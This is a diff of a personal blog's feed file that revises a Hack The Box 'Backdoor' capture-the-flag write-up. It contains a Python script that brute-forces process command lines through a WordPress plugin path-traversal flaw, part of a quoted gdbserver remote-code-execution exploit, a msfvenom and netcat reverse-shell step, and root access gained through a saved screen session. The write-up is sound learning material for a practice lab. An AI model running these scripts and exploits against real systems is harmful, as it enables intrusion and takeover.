@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-30T22:29:57-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - Driver</title><link href="http://localhost:4000/htb-driver/" rel="alternate" type="text/html" title="HTB - Driver" /><published>2022-04-30T00:00:00-04:00</published><updated>2022-04-30T00:00:00-04:00</updated><id>http://localhost:4000/htb-driver</id><content type="html" xml:base="http://localhost:4000/htb-driver/">&lt;p&gt;wichSystem script:&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-01T13:39:24-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - Driver</title><link href="http://localhost:4000/htb-driver/" rel="alternate" type="text/html" title="HTB - Driver" /><published>2022-04-30T00:00:00-04:00</published><updated>2022-04-30T00:00:00-04:00</updated><id>http://localhost:4000/htb-driver</id><content type="html" xml:base="http://localhost:4000/htb-driver/">&lt;p&gt;wichSystem script:&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
 #coding: utf-8
@@ -4305,28 +4305,108 @@ Interesting Finding(s):
 
 &lt;p&gt;So if you asking what is a breakpoint? to understand that we need to know few concepts, first of all our program can have differents bugs, a bug is when we write a piece of code in our program that it doesn’t work correctly as we expected meaning that our program have some kind of fault or error, and this is called a &lt;strong&gt;&lt;em&gt;program having a bug&lt;/em&gt;&lt;/strong&gt;. And the process to find a bug and fixing it is called &lt;strong&gt;&lt;em&gt;debugging&lt;/em&gt;&lt;/strong&gt;. And the tool that we use to debugging is called &lt;strong&gt;&lt;em&gt;debugger&lt;/em&gt;&lt;/strong&gt;. And a &lt;strong&gt;&lt;em&gt;breakepoint&lt;/em&gt;&lt;/strong&gt; which essentially tells the debugger that we want to stop or pause and have a look at what’s going on in a certain line of our program, let’s say i want to debug from the line 1 to 50 but i don’t want to debug the rest of lines of the program, here is where we apply a breakpoint.&lt;/p&gt;
 
-&lt;p&gt;But why we use a debugger? usually when the people are “debugging” what they’ll do is they’ll do someting called “print debugging”, so let’s say that we are never use a debugger, but you’ll prints things to your terminal or in your code to know what’s going on, let’s say that i want to check if a particular variable is working correctly and what i do is print that variable to know if it’s working what i expect to be. But as you soon your code get more complicated and there are bunch of lines of code where you might not know the values you actually want to look at, or you have a lot of files, there is a lot of different states that we want to examine, and it’s get really messy and long time printing things in to the console or in your code instead you can use debugger to do all that complicated and long time task in few seconds, basically it’s to know what’s going wrong in your code. https://www.youtube.com/watch?v=7qZBwhSlfOo&lt;/p&gt;
+&lt;p&gt;But why we use a debugger? usually when the people are “debugging” what they’ll do is they’ll do someting called “print debugging”, so let’s say that we are never use a debugger, but you’ll prints things to your terminal or in your code to know what’s going on, let’s say that i want to check if a particular variable is working correctly and what i do is print that variable to know if it’s working what i expect to be. But as you soon your code get more complicated and there are bunch of lines of code where you might not know the values you actually want to look at, or you have a lot of files, there is a lot of different states that we want to examine, and it’s get really messy and long time printing things in to the console or in your code instead you can use debugger to do all that complicated and long time task in few seconds, basically it’s to know what’s going wrong in your code. more info &lt;a href=&quot;https://www.youtube.com/watch?v=7qZBwhSlfOo&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;So what we are doing here is set a breakpoint, in python to set a breakpoint with pdb library we use &lt;strong&gt;&lt;em&gt;pdb.set_trace()&lt;/em&gt;&lt;/strong&gt; to examine if our code and varibles are working as we expect. And on the variable &lt;strong&gt;&lt;em&gt;r&lt;/em&gt;&lt;/strong&gt; we are sending a GET request to the vulnerable url.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor2/pdb.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;This process we can do it to with wfuzz with the command:&lt;/p&gt;
+&lt;p&gt;Now if we execute the script we will be in the debugger mode. and if list (which will show the current execution point) it’s indicate with arrows the line 18 and this is because since it has gone through the first iteration and it returns to execute the loop again already passed through the breakpoint.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/find.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we list the attributes of variable &lt;strong&gt;&lt;em&gt;r&lt;/em&gt;&lt;/strong&gt;, we can see that there is a “command” that we can use which is &lt;strong&gt;&lt;em&gt;content&lt;/em&gt;&lt;/strong&gt;, which allows us to see the content of that variable. and can we see that it shows us the content of the cmdline file of PID 1. So that variable is working as we expect. and if we check the value of that content we can see that is 120.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/content.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So in the function &lt;strong&gt;&lt;em&gt;makerequest&lt;/em&gt;&lt;/strong&gt; where we have defined the for loop we are going to add the &lt;strong&gt;&lt;em&gt;print(len(r.content))&lt;/em&gt;&lt;/strong&gt; so that it continuously lists the length of the response (http responses).&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/forloop.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now are going to execute the script, and we can see that the first value is 120.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/progress.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we see that some values are duplicated and all the answers are 82. With this we can think that the values of the length that are greater than 82 can return the content of cmdline. Because when we have executed the script the first length was 120 and previously we have seen that it has content in a cmdline file.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/progress2.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Now inside in the function makerequest i we are going to create a progress bar that it defined on the variable &lt;strong&gt;&lt;em&gt;p1&lt;/em&gt;&lt;/strong&gt; and then we want to update that progress bar indicated with &lt;strong&gt;&lt;em&gt;p1.status&lt;/em&gt;&lt;/strong&gt;, and we add another &lt;strong&gt;&lt;em&gt;p1.status&lt;/em&gt;&lt;/strong&gt; to update that progress bar with values and we do that specifying with &lt;strong&gt;&lt;em&gt;%s&lt;/em&gt;&lt;/strong&gt; to replace it with num variable &lt;strong&gt;&lt;em&gt;(“/proc/%s/cmdline % str(num)”)&lt;/em&gt;&lt;/strong&gt;. And lastly we create a if statement so that the values of the length that are greater than 82 that have content it report us on the console, and we do that using the &lt;strong&gt;&lt;em&gt;log.info&lt;/em&gt;&lt;/strong&gt; which is from the pwn library to report the path that have tried and the length.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/if.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And now if we execute the script we can the progress bar and it already reports the first length that 120 has content in the cmdline, which is PID 1 as we have seen previously. And now we need to wait for the others that have content in cmdline.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/execute.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we see that it output the process that is executing the gdbserver and screen as we have already seen in burpsuite and with wfuzz.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura48.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Here is the script if you want to copy:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Exit...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#ctrl+c
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Global variable
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makerequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+     &lt;span class=&quot;c1&quot;&gt;# loop for check PID
+&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Brute Force attack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Starting brute force attack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+     &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+
+         &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying with PATH /proc/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s/cmdline&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+         &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/proc/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/cmdline&quot;&lt;/span&gt;
+
+         &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+             &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+             &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PATH: /proc/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s/cmdline&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+             &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Total length: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+             &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+             &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;------------------------------------------------------------------------------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;makerequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;We click &lt;strong&gt;&lt;em&gt;attack&lt;/em&gt;&lt;/strong&gt; to start the process. and in the response part we can see the processes that it is executing in the command part in the system.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura29.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And boom!!! i found it in the port 1337 its running gdbserver that is a linux debugger.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura30.png&quot; /&gt;
-&lt;/p&gt;
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
 
 &lt;p&gt;Using searchsploit, I wanted to find out if there was any gdbserver exploit, but fortunately I didn’t find anything.&lt;/p&gt;
 
@@ -4334,13 +4414,13 @@ Interesting Finding(s):
 &lt;img src=&quot;/assets/images/img-backdoor/captura31.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Then searching in google i found an gdbserver exploit that allows me to RCE witch is a python script.&lt;/p&gt;
+&lt;p&gt;Then searching in google i found an gdbserver exploit that allows to RCE.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/captura32.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;So this is the script:&lt;/p&gt;
+&lt;p&gt;So this is the exploit:&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)
 # Date: 2021-11-21
@@ -4352,7 +4432,6 @@ Interesting Finding(s):
 &lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
 &lt;/span&gt;
-
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
@@ -4448,27 +4527,32 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura33.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura25.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Then with netcat we ara going to listen on the port 4444 and then execute the exploit specifying the victim machine ip and the payload that we generate with msfvenom.&lt;/p&gt;
+&lt;p&gt;Then with netcat we ara going to listen on the port 443 and then execute the exploit specifying the IP address of the target machine and the payload that we generate with msfvenom, And with that we gain access to the target machine and we are logged in as a user “user”.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura34.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura26.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;And as we can see we have a connection and we are as the user &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt;, and we are going to indicate that we want a pseudo console.&lt;/p&gt;
+&lt;p&gt;And now as we always do we are going to import a tty.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura35.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura35.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;If we want another way to report a pseudo console we can do it using python.&lt;/p&gt;
+&lt;p&gt;And we are going to export two env variables, one is &lt;strong&gt;&lt;em&gt;TERM=xterm&lt;/em&gt;&lt;/strong&gt; and the another &lt;strong&gt;&lt;em&gt;SHELL=bash&lt;/em&gt;&lt;/strong&gt;. And with that we can use command like “clear”, we do ctrl+c, ctrl+l, move comfortably on the reverse shell as if we were in a connection through ssh.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura29.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Remember that we can export a pseudo console with python.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/captura38.png&quot; /&gt;
@@ -4476,43 +4560,61 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 
 &lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;
 
-&lt;p&gt;And with this command I want the remote shell to be the size of my terminal and that it can do ctrl + c and not get out of the session.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura36.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;let’s export two environment variables.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura37.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;And i found the first flag.&lt;/p&gt;
+&lt;p&gt;And if we access with the home directory with the user “user” we can view the first flag which is &lt;strong&gt;&lt;em&gt;user.txt&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/captura39.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;Ok now i need to access as root for this i am going to test if it works for me with the &lt;em&gt;** screen **&lt;/em&gt; command. and if it lets me login as root.&lt;/p&gt;
+&lt;p&gt;So we don’t have a permission to access to the root directory, we can’t list what sudo permissions we have because it requiere password and there is no cron jobs that we can take advantage to escalate privileges.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura40.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura31.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;And we can see tha second flag to submit in the htb.&lt;/p&gt;
+&lt;p&gt;So before we saw that there is a screening process running on the background, let’s check if the screen command have SUID permissions, and as you can see it is.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura41.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura32.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;And with the credentials of the database that we had saved we can use it to access in the database.&lt;/p&gt;
+&lt;p&gt;So some versions of screen is vulnerable to PrivEsc.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/img-backdoor/captura42.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura33.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;p&gt;We can see the databases that are created.&lt;/p&gt;
+&lt;p&gt;But in our case we can’t use those exploits because it’s different and more recent version.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura34.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;If we look the processes on the system and we search for screen, we can see that there is a saved session with the root user and before we see that screen is SUID.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura35.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;So we just need to access with that session that is saved in background, to do that we just use the flag &lt;strong&gt;&lt;em&gt;-x&lt;/em&gt;&lt;/strong&gt; and specify the session. This is similar when we use tmux.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura36.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And we are logged in with root user and we can view the last flag which is &lt;strong&gt;&lt;em&gt;root.txt&lt;/em&gt;&lt;/strong&gt;, and with that we pwned the machine. So the PrivEsc in this case it was very easy.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura37.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Before we obtain database credentials on the &lt;strong&gt;&lt;em&gt;wp-config.php&lt;/em&gt;&lt;/strong&gt; file, we can try to use them to access on the database in the target machine.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-backdoor2/captura38.png&quot; /&gt;
+&lt;/p&gt;
+
